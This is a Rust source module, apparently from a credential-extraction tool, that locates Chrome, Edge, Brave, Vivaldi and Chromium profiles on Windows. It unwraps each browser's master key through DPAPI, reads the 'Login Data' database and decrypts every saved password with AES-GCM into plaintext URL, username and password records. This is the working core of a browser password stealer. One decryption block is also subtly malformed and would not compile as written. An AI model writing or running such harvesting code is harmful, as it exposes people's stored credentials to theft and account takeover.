use std::path::PathBuf;

use serde::Deserialize;

use dirs::data_local_dir;

use aes_gcm::aead::{generic_array::GenericArray, Aead, NewAead};
use aes_gcm::Aes256Gcm;

use rusqlite::{Connection, OpenFlags};

mod bindings {
    windows::include_bindings!();
}

use bindings::Windows::Win32::Security::CryptUnprotectData;
use bindings::Windows::Win32::Security::Cryptography::Core::CRYPTOAPI_BLOB;

use crate::browsers::Credential;
use crate::error::{ExtractorError, ExtractorResult};

#[derive(Deserialize)]
pub struct LocalState {
    pub os_crypt: OSCrypt,
}

#[derive(Deserialize)]
pub struct OSCrypt {
    pub encrypted_key: String,
}

const KNOWN_BROWSER_PATHS: &[&str] = &[
    "Google\\Chrome",
    // "Google\\Chrome SxS",
    "Microsoft\\Edge",
    "Chromium",
    "BraveSoftware\\Brave-Browser",
    "Vivaldi",
];

fn browser_directories() -> ExtractorResult<Vec<PathBuf>> {
    let local_data_dir = data_local_dir().ok_or(ExtractorError::CannotFindLocalDataDirectory)?;

    let mut existing_paths = Vec::new();

    for known_path in KNOWN_BROWSER_PATHS {
        let dir = local_data_dir.join(known_path);

        if dir.exists() {
            existing_paths.push(dir.join("User Data"));
        }
    }

    Ok(existing_paths)
}

pub fn login_credentials() -> ExtractorResult<Vec<Credential>> {
    let mut credentials = Vec::new();

    for path in browser_directories()? {
        let local_state: LocalState =
            serde_json::from_slice(&std::fs::read(path.join("Local State"))?)?;

        // Discard encrypted key prefix "DPAPI"
        // https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_win.cc;l=36
        let mut encrypted_key = base64::decode(local_state.os_crypt.encrypted_key)?[5..].to_vec();

        let mut key_blob = CRYPTOAPI_BLOB {
            cbData: encrypted_key.len() as u32,
            pbData: encrypted_key.as_mut_ptr(),
        };

        let mut key_output = CRYPTOAPI_BLOB::default();

        let encryption_key = unsafe {
            if !CryptUnprotectData(
                &mut key_blob,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                0,
                &mut key_output,
            )
            .as_bool()
            {
                return Err(ExtractorError::Win32CannotDecryptKey);
            }

            GenericArray::from_slice(std::slice::from_raw_parts(
                key_output.pbData,
                key_output.cbData as usize,
            ))
        };

        let cipher = Aes256Gcm::new(encryption_key);

        let login_data = Connection::open_with_flags(
            path.join(["Default", "Login Data"].iter().collect::<PathBuf>()),
            OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
        )?;

        let mut stmt = login_data.prepare_cached(
            "SELECT origin_url, username_value, password_value FROM logins",
        )?;

        let mut rows = stmt.query([])?;

        while let Some(row) = rows.next()? {
            let origin_url = row.get::<_, String>(0)?;
            let username_value = row.get::<_, String>(1)?;
            let password_value = row.get::<_, Vec<u8>>(2)?;

            if password_value.len() <= 0 {
                continue;
            }

            let decrypted_password = {
                if password_value.len() > 0 {
                    // Prefix "v10" is used for AES-GCM encrypted passwords w/ length of 3
                    // https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_win.cc;l=33
                    //
                    // Current nonce length is 96/8
                    // https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_win.cc;l=30
                    //
                    // 3 + (96/8) = 15
                    let nonce = GenericArray::from_slice(&password_value[3..15]);

                    cipher
                        .decrypt(nonce, &password_value[15..])
                        .map_err(|_| ExtractorError::AESGCMCannotDecryptPassword)?
                }
            };

            credentials.push(Credential {
                url: origin_url,
                username: username_value,
                password: String::from_utf8(decrypted_password)
                    .map_err(|_| ExtractorError::AESGCMCannotDecryptPassword)?,
            });
        }
    }

    Ok(credentials)
}
